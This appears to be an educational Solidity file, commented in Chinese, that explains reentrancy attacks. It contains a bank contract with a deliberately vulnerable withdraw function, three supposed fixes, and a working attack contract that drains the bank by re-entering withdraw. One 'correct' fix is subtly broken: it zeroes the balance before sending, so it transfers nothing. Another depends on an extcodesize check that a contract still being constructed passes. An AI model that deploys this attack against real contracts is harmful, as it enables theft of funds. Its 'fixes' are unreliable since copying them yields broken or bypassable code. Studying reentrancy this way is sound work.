// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/**
    https://www.youtube.com/watch?v=wKt9h2Z8QVQ&t=496s
    合约重入攻击，是指在同一交易中对业务合约进行多次调用，从而实现对合约的攻击。
    合约重入
    如果业务合约的公开方法中，有提现 Ether 或者调用第三方合约的操作，那么就可以对合约方法的进行二次以及多次调用，从而实现合约重入。
    重入攻击
    大多数情况下，重入攻击利用了业务合约先提现 Ether 或者调用第三方合约，然后修改合约状态的漏洞，从而实现重入攻击。
 */

contract Bank {

    mapping(address => uint256) public balance;
    uint256 public totalDeposit;
    bool public entered;

    // 重入锁禁止重入
    modifier nonReentrant() {
        require(!entered, "Bank: reentrant call");
        entered = true;
        _;
        entered = false;
    }


    function ethBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function deposit() external payable {
        balance[msg.sender] += msg.value;
        totalDeposit += msg.value;
    }

    function errorWithdraw() external {
        require(balance[msg.sender] > 0, "Bank: no balance");
        (bool success, ) = msg.sender.call{value: balance[msg.sender]}("");
        totalDeposit -= balance[msg.sender];
        balance[msg.sender] = 0;
    }


    // 1. 先更新状态，再转账 (优先修改合约状态，虽然不能禁止合约重入，但可以避免被重入攻击)
    function rightWithdraw1() external {
        require(balance[msg.sender] > 0, "Bank: no balance");
        totalDeposit -= balance[msg.sender];
        balance[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance[msg.sender]}("");
    }

    // 2. 使用 nonReentrant 来禁止合约重入，可以防止重入攻击。
    function rightWithdraw2() nonReentrant external {
        require(balance[msg.sender] > 0, "Bank: no balance");
        (bool success, ) = msg.sender.call{value: balance[msg.sender]}("");
        totalDeposit -= balance[msg.sender];
        balance[msg.sender] = 0;
    }

    // 3. 禁止转账 Ether 到合约地址
    function rightWithdraw3() external {
        require(balance[msg.sender] > 0, "Bank: no balance");
        uint256 size;
        address sender = msg.sender;
        assembly {
            size := extcodesize(sender)
        }
        require(size == 0, "Bank: cannot transfer to contract");
        (bool success, ) = msg.sender.call{value: balance[msg.sender]}("");
        totalDeposit -= balance[msg.sender];
        balance[msg.sender] = 0;
    }

}

contract ReentrancyAttack {

    Bank public bank;

    constructor(address _bank) {
        bank =  Bank(_bank);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.errorWithdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        // 防止出现死循环，出现死循环会导致取不到钱
        if (address(bank).balance > 1 ether) {
            bank.errorWithdraw();
        }
    }
}